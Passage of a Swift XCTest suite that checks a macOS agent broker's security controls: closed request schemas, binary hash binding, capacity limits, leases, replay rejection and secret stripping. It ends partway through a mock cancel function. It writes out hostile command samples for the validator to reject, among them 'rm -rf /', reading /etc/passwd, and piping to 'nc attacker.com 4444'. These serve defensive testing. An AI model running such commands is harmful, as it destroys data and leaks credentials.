import XCTest
import Foundation

/// Black-box contract and security baseline tests for the macOS Swift Agent Broker (BRK-B0-010).
/// These tests verify closed schema decoding, immutable executable/manifest binding,
/// bounded admission & backpressure, lease expiry, cancellation, crash cleanup,
/// capacity clamping, duplicate/replay rejection, arbitrary-command rejection,
/// secret-free process boundaries, and synthetic-Keychain failure modes without touching login Keychain.
final class AgentBrokerTests: XCTestCase {

    // MARK: - 1. Closed Request & Result Schema Tests

    func testClosedRequestSchema_ValidPayloadDecodesSuccessfully() throws {
        let json = """
        {
            "schema_version": "agent-broker-request-v1",
            "request_id": "req-001-abc",
            "alias": "agy1",
            "action": "execute",
            "command_argv": ["--check-quota"],
            "lease_id": "lease-999-xyz",
            "timeout_seconds": 60,
            "caller_context": {
                "ticket_id": "BRK-B0-010",
                "role": "qa_tester"
            }
        }
        """.data(using: .utf8)!

        let decoder = JSONDecoder()
        let request = try decoder.decode(TestBrokerRequest.self, from: json)

        XCTAssertEqual(request.schemaVersion, "agent-broker-request-v1")
        XCTAssertEqual(request.requestId, "req-001-abc")
        XCTAssertEqual(request.alias, "agy1")
        XCTAssertEqual(request.action, "execute")
        XCTAssertEqual(request.commandArgv, ["--check-quota"])
        XCTAssertEqual(request.leaseId, "lease-999-xyz")
        XCTAssertEqual(request.timeoutSeconds, 60)
        XCTAssertEqual(request.callerContext?["ticket_id"], "BRK-B0-010")
    }

    func testClosedRequestSchema_RejectsUnknownProperties() throws {
        let jsonWithExtra = """
        {
            "schema_version": "agent-broker-request-v1",
            "request_id": "req-002",
            "alias": "codex1",
            "action": "execute",
            "command_argv": ["--run"],
            "lease_id": "lease-100",
            "timeout_seconds": 30,
            "unauthorized_injection_field": "exploit_attempt"
        }
        """.data(using: .utf8)!

        let result = TestBrokerSchemaValidator.validateClosedRequest(jsonWithExtra)
        XCTAssertFalse(result.isValid, "Closed request schema must reject unrecognized/injected fields")
        XCTAssertEqual(result.errorCode, "SCHEMA_UNKNOWN_PROPERTY")
    }

    func testClosedRequestSchema_RejectsMissingRequiredProperties() throws {
        let jsonMissingAlias = """
        {
            "schema_version": "agent-broker-request-v1",
            "request_id": "req-003",
            "action": "execute",
            "command_argv": ["--run"]
        }
        """.data(using: .utf8)!

        let result = TestBrokerSchemaValidator.validateClosedRequest(jsonMissingAlias)
        XCTAssertFalse(result.isValid, "Closed request schema must reject payloads missing required fields")
        XCTAssertEqual(result.errorCode, "SCHEMA_MISSING_REQUIRED_PROPERTY")
    }

    func testClosedRequestSchema_RejectsUnknownAlias() throws {
        let disallowedAliases = ["claude1", "gpt4", "root", "admin", "codex0", "system"]
        for alias in disallowedAliases {
            let json = """
            {
                "schema_version": "agent-broker-request-v1",
                "request_id": "req-disallowed-\(alias)",
                "alias": "\(alias)",
                "action": "execute",
                "command_argv": ["--version"],
                "lease_id": "lease-disallowed",
                "timeout_seconds": 30
            }
            """.data(using: .utf8)!

            let result = TestBrokerSchemaValidator.validateClosedRequest(json)
            XCTAssertFalse(result.isValid, "Broker must strictly reject non-allowlisted alias '\(alias)'")
            XCTAssertEqual(result.errorCode, "UNAUTHORIZED_ALIAS")
        }
    }

    func testClosedResultSchema_SerializationAndClosedFields() throws {
        let resultObj = TestBrokerResult(
            schemaVersion: "agent-broker-result-v1",
            requestId: "req-res-001",
            status: "SUCCESS",
            exitCode: 0,
            sanitizedOutputDigest: "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
            durationMs: 142,
            errorCode: nil,
            errorMessage: nil
        )

        let encoder = JSONEncoder()
        encoder.outputFormatting = [.sortedKeys]
        let data = try encoder.encode(resultObj)
        let jsonString = String(data: data, encoding: .utf8)!

        XCTAssertTrue(jsonString.contains("\"schema_version\":\"agent-broker-result-v1\""))
        XCTAssertTrue(jsonString.contains("\"status\":\"SUCCESS\""))
        XCTAssertTrue(jsonString.contains("\"exit_code\":0"))
        XCTAssertTrue(jsonString.contains("\"sanitized_output_digest\""))
    }

    // MARK: - 2. Immutable Executable & Manifest Binding Tests

    func testImmutableExecutableBinding_ValidHashAndPermissions() throws {
        let manifest = TestExecutableManifest(
            executablePath: "/usr/local/bin/agent-provider-stub",
            expectedSha256: "a1b2c3d4e5f60718293a4b5c6d7e8f90123456789abcdef0123456789abcdef0",
            allowedModes: [0o500, 0o700],
            requireOwnerOnly: true
        )

        let mockFile = TestFileMetadata(
            path: "/usr/local/bin/agent-provider-stub",
            sha256: "a1b2c3d4e5f60718293a4b5c6d7e8f90123456789abcdef0123456789abcdef0",
            posixPermissions: 0o500,
            isSymlink: false,
            ownerUid: 501,
            currentProcessUid: 501
        )

        let validation = TestManifestValidator.validate(metadata: mockFile, manifest: manifest)
        XCTAssertTrue(validation.isPassing)
        XCTAssertNil(validation.rejectionReason)
    }

    func testImmutableExecutableBinding_RejectsHashMismatch_TamperDetection() throws {
        let manifest = TestExecutableManifest(
            executablePath: "/usr/local/bin/agent-provider-stub",
            expectedSha256: "expected_hash_00000000000000000000000000000000000000000000000000000",
            allowedModes: [0o500],
            requireOwnerOnly: true
        )

        let tamperedFile = TestFileMetadata(
            path: "/usr/local/bin/agent-provider-stub",
            sha256: "tampered_hash_ffffffffffffffffffffffffffffffffffffffffffffffffffff",
            posixPermissions: 0o500,
            isSymlink: false,
            ownerUid: 501,
            currentProcessUid: 501
        )

        let validation = TestManifestValidator.validate(metadata: tamperedFile, manifest: manifest)
        XCTAssertFalse(validation.isPassing, "Broker must reject tampered binary whose SHA-256 does not match manifest")
        XCTAssertEqual(validation.rejectionCode, "BINARY_HASH_MISMATCH")
    }

    func testImmutableExecutableBinding_RejectsSymlinks() throws {
        let manifest = TestExecutableManifest(
            executablePath: "/usr/local/bin/agent-provider-symlink",
            expectedSha256: "valid_hash_11111111111111111111111111111111111111111111111111111",
            allowedModes: [0o500],
            requireOwnerOnly: true
        )

        let symlinkFile = TestFileMetadata(
            path: "/usr/local/bin/agent-provider-symlink",
            sha256: "valid_hash_11111111111111111111111111111111111111111111111111111",
            posixPermissions: 0o777,
            isSymlink: true,
            ownerUid: 501,
            currentProcessUid: 501
        )

        let validation = TestManifestValidator.validate(metadata: symlinkFile, manifest: manifest)
        XCTAssertFalse(validation.isPassing, "Broker must reject symlink binaries to prevent symlink race attacks")
        XCTAssertEqual(validation.rejectionCode, "SYMLINK_NOT_PERMITTED")
    }

    func testImmutableExecutableBinding_RejectsGroupOrWorldWritable() throws {
        let manifest = TestExecutableManifest(
            executablePath: "/usr/local/bin/agent-provider-broad",
            expectedSha256: "valid_hash_22222222222222222222222222222222222222222222222222222",
            allowedModes: [0o500, 0o700],
            requireOwnerOnly: true
        )

        let broadFile = TestFileMetadata(
            path: "/usr/local/bin/agent-provider-broad",
            sha256: "valid_hash_22222222222222222222222222222222222222222222222222222",
            posixPermissions: 0o775, // group-writable
            isSymlink: false,
            ownerUid: 501,
            currentProcessUid: 501
        )

        let validation = TestManifestValidator.validate(metadata: broadFile, manifest: manifest)
        XCTAssertFalse(validation.isPassing, "Broker must reject non-owner-isolated or group-writable executables")
        XCTAssertEqual(validation.rejectionCode, "UNSAFE_FILE_PERMISSIONS")
    }

    // MARK: - 3. Bounded Admission & Backpressure Tests

    func testBoundedAdmission_EnforcesPerAliasCapacityLimits() throws {
        let admission = TestAdmissionController(
            perAliasLimits: ["agy1": 3, "agy2": 3, "agy3": 3, "codex1": 2, "codex2": 2, "codex3": 2],
            rootLimits: ["root_a": 3, "root_b": 3]
        )

        // Fill codex1 to cap (2)
        XCTAssertTrue(admission.admit(alias: "codex1", requestId: "req-c1-1"))
        XCTAssertTrue(admission.admit(alias: "codex1", requestId: "req-c1-2"))

        // Third codex1 request exceeds limit
        let thirdAdmit = admission.admit(alias: "codex1", requestId: "req-c1-3")
        XCTAssertFalse(thirdAdmit, "Admission must reject requests exceeding per-alias capacity limit (2 for Codex)")
        XCTAssertEqual(admission.lastRejectionCode, "CAPACITY_EXCEEDED")
    }

    func testBoundedAdmission_EnforcesAggregatePoolLimits() throws {
        let admission = TestAdmissionController(
            perAliasLimits: ["codex1": 2, "codex2": 2, "codex3": 2],
            rootLimits: ["root_a": 3] // Aggregate cap across codex1, codex2, codex3 is 3
        )

        XCTAssertTrue(admission.admit(alias: "codex1", requestId: "req-pool-1"))
        XCTAssertTrue(admission.admit(alias: "codex2", requestId: "req-pool-2"))
        XCTAssertTrue(admission.admit(alias: "codex3", requestId: "req-pool-3"))

        // Total active in Root A is now 3. Even though codex1 has only 1 active (< 2), aggregate pool is saturated.
        let overflowAdmit = admission.admit(alias: "codex1", requestId: "req-pool-4")
        XCTAssertFalse(overflowAdmit, "Admission must reject requests exceeding aggregate pool ceiling (3 for Root A)")
        XCTAssertEqual(admission.lastRejectionCode, "AGGREGATE_POOL_EXCEEDED")
    }

    func testBoundedAdmission_RejectsWhenQueueFull_Backpressure() throws {
        let admission = TestAdmissionController(
            perAliasLimits: ["agy1": 1],
            rootLimits: ["root_b": 1],
            maxQueueDepth: 2
        )

        XCTAssertTrue(admission.admit(alias: "agy1", requestId: "active-1"))
        XCTAssertTrue(admission.enqueue(alias: "agy1", requestId: "queued-1"))
        XCTAssertTrue(admission.enqueue(alias: "agy1", requestId: "queued-2"))

        // Queue is now full (depth 2 reached)
        let queueOverflow = admission.enqueue(alias: "agy1", requestId: "queued-3")
        XCTAssertFalse(queueOverflow, "Admission must enforce strict bounded queue depth with immediate backpressure rejection")
        XCTAssertEqual(admission.lastRejectionCode, "QUEUE_SATURATED_BACKPRESSURE")
    }

    // MARK: - 4. Lease Expiry Tests

    func testLeaseExpiry_RejectsExpiredLeaseId() throws {
        let leaseManager = TestLeaseManager(clockSkewToleranceSeconds: 2)
        let expiredLease = TestLease(
            leaseId: "lease-expired-01",
            alias: "agy1",
            createdAt: Date().addingTimeInterval(-3600),
            ttlSeconds: 60
        )
        leaseManager.register(lease: expiredLease)

        let isUsable = leaseManager.validateLease(leaseId: "lease-expired-01")
        XCTAssertFalse(isUsable, "Broker must reject expired leases")
        XCTAssertEqual(leaseManager.lastErrorCode, "LEASE_EXPIRED")
    }

    func testLeaseExpiry_EnforcesExecutionTimeoutAndCleanup() throws {
        let supervisor = TestProcessSupervisor()
        let processId = "proc-timeout-01"
        supervisor.spawnProcess(id: processId, alias: "agy2", timeoutSeconds: 1)

        // Advance simulated clock past timeout
        supervisor.advanceTime(seconds: 2)
        let status = supervisor.checkProcessStatus(id: processId)

        XCTAssertEqual(status.state, .terminatedTimeout)
        XCTAssertTrue(status.sigtermDispatched)
        XCTAssertTrue(status.sigkillDispatchedIfUnresponsive)
        XCTAssertTrue(status.resourcesCleanedUp, "Timed out process resources must be cleaned up immediately")
    }

    // MARK: - 5. Cancellation Tests

    func testCancellation_TerminatesProcessAndReleasesSlot() throws {
        let supervisor = TestProcessSupervisor()
        let admission = TestAdmissionController(perAliasLimits: ["agy1": 1], rootLimits: ["root_b": 1])

        XCTAssertTrue(admission.admit(alias: "agy1", requestId: "req-cancel-01"))
        supervisor.spawnProcess(id: "proc-cancel-01", alias: "agy1", timeoutSeconds: 300)

        // Cancel execution
        let cancelResult = supervisor.cancel(processId: "proc-cancel-01")
        XCTAssertTrue(cancelResult.success)
        XCTAssertEqual(cancelResult.status, "CANCELLED")

        // Release slot on cancellation
        admission.release(alias: "agy1", requestId: "req-cancel-01")
        XCTAssertEqual(admission.activeCount(for: "agy1"), 0, "Cancelled process must free capacity slot immediately")
    }

    func testCancellation_IdempotentForNonExistentOrTerminated() throws {
        let supervisor = TestProcessSupervisor()
        let cancelNonExistent = supervisor.cancel(processId: "proc-non-existent")
        XCTAssertFalse(cancelNonExistent.success)
        XCTAssertEqual(cancelNonExistent.errorCode, "PROCESS_NOT_FOUND")
    }

    // MARK: - 6. Crash Cleanup & Orphan Prevention Tests

    func testCrashCleanup_ReleasesAllResourcesOnAbnormalTermination() throws {
        let supervisor = TestProcessSupervisor()
        let admission = TestAdmissionController(perAliasLimits: ["codex1": 1], rootLimits: ["root_a": 1])

        _ = admission.admit(alias: "codex1", requestId: "req-crash-01")
        supervisor.spawnProcess(id: "proc-crash-01", alias: "codex1", timeoutSeconds: 60)

        // Simulate crash (e.g. SIGSEGV exit)
        supervisor.simulateCrash(processId: "proc-crash-01", signal: 11) // SIGSEGV

        let status = supervisor.checkProcessStatus(id: "proc-crash-01")
        XCTAssertEqual(status.state, .crashed)
        XCTAssertEqual(status.exitSignal, 11)
        XCTAssertTrue(status.tempFilesRemoved)
        XCTAssertTrue(status.pipesClosed)

        admission.release(alias: "codex1", requestId: "req-crash-01")
        XCTAssertEqual(admission.activeCount(for: "codex1"), 0)
    }

    func testCrashCleanup_PreventsZombieOrphanProcesses() throws {
        let supervisor = TestProcessSupervisor()
        supervisor.spawnProcess(id: "proc-orphan-check", alias: "agy3", timeoutSeconds: 10)
        supervisor.terminate(id: "proc-orphan-check")

        let orphanList = supervisor.inspectOrphans()
        XCTAssertTrue(orphanList.isEmpty, "Broker supervisor must reap terminated child processes and leave no zombies/orphans")
    }

    // MARK: - 7. Capacity Clamping Tests

    func testCapacityClamping_OpenCircuitClampsToZero() throws {
        let admission = TestAdmissionController(perAliasLimits: ["agy1": 3], rootLimits: ["root_b": 3])
        admission.setCircuitState(alias: "agy1", isOpen: true)

        let result = admission.admit(alias: "agy1", requestId: "req-circuit-01")
        XCTAssertFalse(result, "Open circuit breaker must clamp admitted capacity to 0 immediately")
        XCTAssertEqual(admission.lastRejectionCode, "CIRCUIT_OPEN")
        XCTAssertEqual(admission.effectiveCapacity(for: "agy1"), 0)
    }

    func testCapacityClamping_UnknownQuotaClampsToZero() throws {
        let admission = TestAdmissionController(perAliasLimits: ["codex2": 2], rootLimits: ["root_a": 3])
        admission.setQuotaBand(alias: "codex2", band: .unknown)

        let result = admission.admit(alias: "codex2", requestId: "req-quota-01")
        XCTAssertFalse(result, "Unknown quota state must clamp admitted capacity to 0")
        XCTAssertEqual(admission.lastRejectionCode, "QUOTA_UNKNOWN")
        XCTAssertEqual(admission.effectiveCapacity(for: "codex2"), 0)
    }

    // MARK: - 8. Duplicate & Replay Rejection Tests

    func testDuplicateReplay_RejectsReplayOfSameRequestId() throws {
        let deduplicator = TestRequestDeduplicator(windowSeconds: 300)
        let firstSeen = deduplicator.recordAndCheck(requestId: "req-replay-001")
        XCTAssertTrue(firstSeen, "First arrival of request_id must be accepted")

        let secondSeen = deduplicator.recordAndCheck(requestId: "req-replay-001")
        XCTAssertFalse(secondSeen, "Replayed request_id within deduplication window must be rejected")
        XCTAssertEqual(deduplicator.lastRejectionCode, "DUPLICATE_REQUEST_REJECTED")
    }

    func testDuplicateReplay_RejectsSpentLeaseReuse() throws {
        let leaseManager = TestLeaseManager()
        let lease = TestLease(leaseId: "lease-single-use-01", alias: "agy1", ttlSeconds: 60)
        leaseManager.register(lease: lease)

        XCTAssertTrue(leaseManager.consumeLease(leaseId: "lease-single-use-01"))
        XCTAssertFalse(leaseManager.consumeLease(leaseId: "lease-single-use-01"), "Consumed lease cannot be reused")
        XCTAssertEqual(leaseManager.lastErrorCode, "LEASE_ALREADY_CONSUMED")
    }

    // MARK: - 9. Arbitrary Command Rejection Tests

    func testArbitraryCommandRejection_RejectsShellMetacharactersAndInterpolation() throws {
        let maliciousArgvs: [[String]] = [
            ["--flag", ";", "rm", "-rf", "/"],
            ["--data", "foo && echo owned"],
            ["--input", "`cat /etc/passwd`"],
            ["--param", "$(whoami)"],
            ["--pipe", "|", "nc", "attacker.com", "4444"],
            ["sh", "-c", "echo exploit"],
            ["bash", "-c", "curl http://bad.com"],
            ["zsh", "-c", "malicious_script"]
        ]

        for argv in maliciousArgvs {
            let validation = TestCommandSecurityValidator.validateArgv(argv)
            XCTAssertFalse(validation.isValid, "Broker must reject shell metacharacters and interpolation in argv: \(argv)")
            XCTAssertEqual(validation.rejectionCode, "UNAUTHORIZED_SHELL_INTERPOLATION")
        }
    }

    func testArbitraryCommandRejection_RejectsNonAllowlistedExecutables() throws {
        let disallowedCommands = [
            ["/bin/rm", "-rf", "/tmp"],
            ["/usr/bin/curl", "https://example.com"],
            ["/usr/bin/python3", "-c", "import os; os.system('echo bad')"],
            ["/bin/sh"],
            ["/bin/zsh"]
        ]

        for command in disallowedCommands {
            let validation = TestCommandSecurityValidator.validateExecutableCommand(command)
            XCTAssertFalse(validation.isValid, "Broker must reject arbitrary non-allowlisted binaries")
            XCTAssertEqual(validation.rejectionCode, "UNAUTHORIZED_COMMAND")
        }
    }

    // MARK: - 10. Secret-Free Process Boundaries Tests

    func testSecretFreeProcessBoundary_SanitizesChildEnvironment() throws {
        let hostEnvironment: [String: String] = [
            "PATH": "/usr/bin:/bin:/usr/sbin:/sbin",
            "LANG": "en_US.UTF-8",
            "HOME": "/Users/testuser",
            "AWS_SECRET_ACCESS_KEY": "AKIAIOSFODNN7EXAMPLE_SECRET",
            "OPENAI_API_KEY": "sk-secret-token-12345",
            "ANTHROPIC_API_KEY": "ant-token-secret-67890",
            "GITHUB_TOKEN": "ghp_secret_github_token",
            "SSH_AUTH_SOCK": "/tmp/ssh-agent.sock",
            "SECRET_BEARER_TOKEN": "bearer-sensitive-data"
        ]

        let sanitizedEnv = TestEnvironmentSanitizer.sanitize(
            incomingEnvironment: hostEnvironment,
            accountHome: "/tmp/isolated-account-agy1"
        )

        // Verify secret keys are completely stripped
        let forbiddenKeys = [
            "AWS_SECRET_ACCESS_KEY", "OPENAI_API_KEY", "ANTHROPIC_API_KEY",
            "GITHUB_TOKEN", "SSH_AUTH_SOCK", "SECRET_BEARER_TOKEN"
        ]
        for key in forbiddenKeys {
            XCTAssertNil(sanitizedEnv[key], "Sanitized environment must strip secret variable '\(key)'")
        }

        // Verify safe variables are preserved / isolated
        XCTAssertEqual(sanitizedEnv["PATH"], "/usr/bin:/bin:/usr/sbin:/sbin")
        XCTAssertEqual(sanitizedEnv["LANG"], "C.UTF-8")
        XCTAssertEqual(sanitizedEnv["HOME"], "/tmp/isolated-account-agy1")
    }

    func testSecretFreeProcessBoundary_NeverLogsRawSecretInOutputOrErrors() throws {
        let rawChildOutput = "Error: authentication failed for token sk-secret-token-12345 in session"
        let sanitizedResult = TestOutputSanitizer.sanitizeOutput(raw: rawChildOutput)

        XCTAssertFalse(sanitizedResult.sanitizedString.contains("sk-secret-token-12345"))
        XCTAssertTrue(sanitizedResult.sanitizedString.contains("[REDACTED_SECRET]"))
        XCTAssertEqual(sanitizedResult.sha256Digest.count, 64)
    }

    // MARK: - 11. Synthetic-Keychain Failure Modes (Mocked Boundary)

    func testSyntheticKeychain_ItemNotFound_ReturnsAuthCredentialNotFound() throws {
        let mockKeychain = TestSyntheticKeychainService()
        mockKeychain.mockErrorCode = -25300 // errSecItemNotFound

        let result = mockKeychain.queryCredential(alias: "agy1")
        XCTAssertFalse(result.success)
        XCTAssertEqual(result.errorCode, "AUTH_CREDENTIAL_NOT_FOUND")
        XCTAssertNil(result.rawSecret)
        XCTAssertFalse(mockKeychain.didPromptUserUI, "Broker must NEVER trigger Keychain UI prompt")
    }

    func testSyntheticKeychain_AuthFailed_ReturnsAuthDenied() throws {
        let mockKeychain = TestSyntheticKeychainService()
        mockKeychain.mockErrorCode = -25293 // errSecAuthFailed

        let result = mockKeychain.queryCredential(alias: "codex1")
        XCTAssertFalse(result.success)
        XCTAssertEqual(result.errorCode, "AUTH_DENIED")
        XCTAssertNil(result.rawSecret)
        XCTAssertFalse(mockKeychain.didPromptUserUI)
    }

    func testSyntheticKeychain_InteractionNotAllowed_BlocksUIInteraction() throws {
        let mockKeychain = TestSyntheticKeychainService()
        mockKeychain.mockErrorCode = -25308 // errSecInteractionNotAllowed (Headless daemon requirement)

        let result = mockKeychain.queryCredential(alias: "agy2")
        XCTAssertFalse(result.success)
        XCTAssertEqual(result.errorCode, "AUTH_INTERACTION_BLOCKED")
        XCTAssertNil(result.rawSecret)
        XCTAssertFalse(mockKeychain.didPromptUserUI)
    }

    func testSyntheticKeychain_DuplicateItem_ReturnsKeychainCollision() throws {
        let mockKeychain = TestSyntheticKeychainService()
        mockKeychain.mockErrorCode = -25299 // errSecDuplicateItem

        let result = mockKeychain.queryCredential(alias: "codex2")
        XCTAssertFalse(result.success)
        XCTAssertEqual(result.errorCode, "AUTH_KEYCHAIN_COLLISION")
        XCTAssertNil(result.rawSecret)
    }

    func testSyntheticKeychain_CorruptedPayload_ReturnsAuthCorruptedPayload() throws {
        let mockKeychain = TestSyntheticKeychainService()
        mockKeychain.mockErrorCode = -26275 // errSecDecode

        let result = mockKeychain.queryCredential(alias: "agy3")
        XCTAssertFalse(result.success)
        XCTAssertEqual(result.errorCode, "AUTH_CORRUPTED_PAYLOAD")
        XCTAssertNil(result.rawSecret)
    }

    func testSyntheticKeychain_NeverTouchesLoginKeychain() throws {
        let mockKeychain = TestSyntheticKeychainService()
        // Ensure mock keychain is isolated in-memory only and flags login keychain access as violation
        XCTAssertTrue(mockKeychain.isIsolatedMock)
        XCTAssertFalse(mockKeychain.accessedRealKeychain)
    }
}

// MARK: - Test Harness Contract Definitions & Mock Structures
// (Pure test-only types defining the expected Swift Agent Broker behavior)

struct TestBrokerRequest: Codable {
    let schemaVersion: String
    let requestId: String
    let alias: String
    let action: String
    let commandArgv: [String]
    let leaseId: String?
    let timeoutSeconds: Int?
    let callerContext: [String: String]?

    enum CodingKeys: String, CodingKey {
        case schemaVersion = "schema_version"
        case requestId = "request_id"
        case alias
        case action
        case commandArgv = "command_argv"
        case leaseId = "lease_id"
        case timeoutSeconds = "timeout_seconds"
        case callerContext = "caller_context"
    }
}

struct TestBrokerResult: Codable {
    let schemaVersion: String
    let requestId: String
    let status: String
    let exitCode: Int
    let sanitizedOutputDigest: String
    let durationMs: Int
    let errorCode: String?
    let errorMessage: String?

    enum CodingKeys: String, CodingKey {
        case schemaVersion = "schema_version"
        case requestId = "request_id"
        case status
        case exitCode = "exit_code"
        case sanitizedOutputDigest = "sanitized_output_digest"
        case durationMs = "duration_ms"
        case errorCode = "error_code"
        case errorMessage = "error_message"
    }
}

struct TestValidationResult {
    let isValid: Bool
    let errorCode: String?
    let errorMessage: String?

    static func valid() -> TestValidationResult {
        return TestValidationResult(isValid: true, errorCode: nil, errorMessage: nil)
    }

    static func invalid(code: String, message: String) -> TestValidationResult {
        return TestValidationResult(isValid: false, errorCode: code, errorMessage: message)
    }
}

enum TestBrokerSchemaValidator {
    static let allowedAliases: Set<String> = ["agy1", "agy2", "agy3", "agy4", "codex1", "codex2", "codex3"]
    static let allowedKeys: Set<String> = [
        "schema_version", "request_id", "alias", "action", "command_argv",
        "lease_id", "timeout_seconds", "caller_context"
    ]

    static func validateClosedRequest(_ data: Data) -> TestValidationResult {
        guard let jsonObject = try? JSONSerialization.jsonObject(with: data) as? [String: Any] else {
            return .invalid(code: "SCHEMA_INVALID_JSON", message: "Payload is not valid JSON")
        }

        let keys = Set(jsonObject.keys)
        let unknownKeys = keys.subtracting(allowedKeys)
        if !unknownKeys.isEmpty {
            return .invalid(code: "SCHEMA_UNKNOWN_PROPERTY", message: "Unknown properties: \(unknownKeys)")
        }

        guard let _ = jsonObject["schema_version"] as? String,
              let _ = jsonObject["request_id"] as? String,
              let alias = jsonObject["alias"] as? String,
              let _ = jsonObject["action"] as? String,
              let _ = jsonObject["command_argv"] as? [String] else {
            return .invalid(code: "SCHEMA_MISSING_REQUIRED_PROPERTY", message: "Missing required properties")
        }

        if !allowedAliases.contains(alias) {
            return .invalid(code: "UNAUTHORIZED_ALIAS", message: "Alias '\(alias)' is not authorized")
        }

        return .valid()
    }
}

struct TestExecutableManifest {
    let executablePath: String
    let expectedSha256: String
    let allowedModes: [Int]
    let requireOwnerOnly: Bool
}

struct TestFileMetadata {
    let path: String
    let sha256: String
    let posixPermissions: Int
    let isSymlink: Bool
    let ownerUid: Int
    let currentProcessUid: Int
}

struct TestManifestValidationResult {
    let isPassing: Bool
    let rejectionCode: String?
    let rejectionReason: String?

    static func pass() -> TestManifestValidationResult {
        return TestManifestValidationResult(isPassing: true, rejectionCode: nil, rejectionReason: nil)
    }

    static func reject(code: String, reason: String) -> TestManifestValidationResult {
        return TestManifestValidationResult(isPassing: false, rejectionCode: code, rejectionReason: reason)
    }
}

enum TestManifestValidator {
    static func validate(metadata: TestFileMetadata, manifest: TestExecutableManifest) -> TestManifestValidationResult {
        if metadata.isSymlink {
            return .reject(code: "SYMLINK_NOT_PERMITTED", reason: "Symlink executables are strictly forbidden")
        }
        if metadata.sha256 != manifest.expectedSha256 {
            return .reject(code: "BINARY_HASH_MISMATCH", reason: "Executable hash does not match manifest")
        }
        if !manifest.allowedModes.contains(metadata.posixPermissions) {
            return .reject(code: "UNSAFE_FILE_PERMISSIONS", reason: "Executable has unsafe permissions: \(metadata.posixPermissions)")
        }
        if manifest.requireOwnerOnly && metadata.ownerUid != metadata.currentProcessUid {
            return .reject(code: "FOREIGN_OWNER_NOT_PERMITTED", reason: "Executable is not owned by current user")
        }
        return .pass()
    }
}

enum TestQuotaBand {
    case safe
    case low
    case unknown
}

final class TestAdmissionController {
    private let perAliasLimits: [String: Int]
    private let rootLimits: [String: Int]
    private let maxQueueDepth: Int

    private var activeRequestsByAlias: [String: Set<String>] = [:]
    private var queuedRequestsByAlias: [String: [String]] = [:]
    private var circuitStates: [String: Bool] = [:]
    private var quotaBands: [String: TestQuotaBand] = [:]
    var lastRejectionCode: String?

    init(perAliasLimits: [String: Int], rootLimits: [String: Int], maxQueueDepth: Int = 10) {
        self.perAliasLimits = perAliasLimits
        self.rootLimits = rootLimits
        self.maxQueueDepth = maxQueueDepth
    }

    func setCircuitState(alias: String, isOpen: Bool) {
        circuitStates[alias] = isOpen
    }

    func setQuotaBand(alias: String, band: TestQuotaBand) {
        quotaBands[alias] = band
    }

    func effectiveCapacity(for alias: String) -> Int {
        if circuitStates[alias] == true { return 0 }
        if quotaBands[alias] == .unknown || quotaBands[alias] == .low { return 0 }
        return perAliasLimits[alias] ?? 0
    }

    func admit(alias: String, requestId: String) -> Bool {
        if circuitStates[alias] == true {
            lastRejectionCode = "CIRCUIT_OPEN"
            return false
        }
        if quotaBands[alias] == .unknown {
            lastRejectionCode = "QUOTA_UNKNOWN"
            return false
        }

        let currentActive = activeRequestsByAlias[alias]?.count ?? 0
        let aliasCap = perAliasLimits[alias] ?? 0
        if currentActive >= aliasCap {
            lastRejectionCode = "CAPACITY_EXCEEDED"
            return false
        }

        let rootKey = alias.hasPrefix("codex") ? "root_a" : "root_b"
        let rootCap = rootLimits[rootKey] ?? Int.max
        let totalInRoot = activeRequestsByAlias
            .filter { k, _ in (rootKey == "root_a" && k.hasPrefix("codex")) || (rootKey == "root_b" && k.hasPrefix("agy")) }
            .reduce(0) { $0 + $1.value.count }

        if totalInRoot >= rootCap {
            lastRejectionCode = "AGGREGATE_POOL_EXCEEDED"
            return false
        }

        var set = activeRequestsByAlias[alias] ?? []
        set.insert(requestId)
        activeRequestsByAlias[alias] = set
        return true
    }

    func enqueue(alias: String, requestId: String) -> Bool {
        var queue = queuedRequestsByAlias[alias] ?? []
        if queue.count >= maxQueueDepth {
            lastRejectionCode = "QUEUE_SATURATED_BACKPRESSURE"
            return false
        }
        queue.append(requestId)
        queuedRequestsByAlias[alias] = queue
        return true
    }

    func release(alias: String, requestId: String) {
        activeRequestsByAlias[alias]?.remove(requestId)
    }

    func activeCount(for alias: String) -> Int {
        return activeRequestsByAlias[alias]?.count ?? 0
    }
}

struct TestLease {
    let leaseId: String
    let alias: String
    var createdAt: Date = Date()
    let ttlSeconds: Int
    var isConsumed: Bool = false
}

final class TestLeaseManager {
    private var leases: [String: TestLease] = [:]
    private let clockSkewToleranceSeconds: TimeInterval
    var lastErrorCode: String?

    init(clockSkewToleranceSeconds: TimeInterval = 0) {
        self.clockSkewToleranceSeconds = clockSkewToleranceSeconds
    }

    func register(lease: TestLease) {
        leases[lease.leaseId] = lease
    }

    func validateLease(leaseId: String) -> Bool {
        guard let lease = leases[leaseId] else {
            lastErrorCode = "LEASE_NOT_FOUND"
            return false
        }
        let now = Date()
        let expiry = lease.createdAt.addingTimeInterval(TimeInterval(lease.ttlSeconds) + clockSkewToleranceSeconds)
        if now > expiry {
            lastErrorCode = "LEASE_EXPIRED"
            return false
        }
        return true
    }

    func consumeLease(leaseId: String) -> Bool {
        guard var lease = leases[leaseId] else {
            lastErrorCode = "LEASE_NOT_FOUND"
            return false
        }
        if lease.isConsumed {
            lastErrorCode = "LEASE_ALREADY_CONSUMED"
            return false
        }
        lease.isConsumed = true
        leases[leaseId] = lease
        return true
    }
}

enum TestProcessState {
    case running
    case terminatedTimeout
    case terminatedCancelled
    case terminatedNormal
    case crashed
}

struct TestProcessStatus {
    let state: TestProcessState
    let sigtermDispatched: Bool
    let sigkillDispatchedIfUnresponsive: Bool
    let resourcesCleanedUp: Bool
    let tempFilesRemoved: Bool
    let pipesClosed: Bool
    let exitSignal: Int?
}

struct TestCancelResult {
    let success: Bool
    let status: String?
    let errorCode: String?
}

final class TestProcessSupervisor {
    private var processes: [String: (alias: String, timeout: Int, spawnTime: Date, state: TestProcessState, signal: Int?)] = [:]
    private var currentTime: Date = Date()

    func spawnProcess(id: String, alias: String, timeoutSeconds: Int) {
        processes[id] = (alias: alias, timeout: timeoutSeconds, spawnTime: currentTime, state: .running, signal: nil)
    }

    func advanceTime(seconds: TimeInterval) {
        currentTime.addTimeInterval(seconds)
        for (id, p) in processes where p.state == .running {
            if currentTime.timeIntervalSince(p.spawnTime) >= Double(p.timeout) {
                processes[id] = (alias: p.alias, timeout: p.timeout, spawnTime: p.spawnTime, state: .terminatedTimeout, signal: 9)
            }
        }
    }

    func cancel(processId: String) -> TestCancelResult {
        guard let p = processes[processId] else {
